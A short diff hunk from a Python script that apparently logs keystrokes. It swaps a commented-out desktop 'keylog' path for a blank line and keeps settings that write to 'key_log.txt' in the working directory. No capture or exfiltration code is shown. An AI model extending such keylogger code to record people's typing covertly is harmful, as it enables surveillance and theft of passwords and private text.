@@ -53,7 +53,7 @@ def rep():
 
 
 
-# file_path = "C:\\Users\\Ibrahimgidi\\Desktop\\keylog"
+
 file_path = os.getcwd()
 extend = "\\"
 keys_information = "key_log.txt"
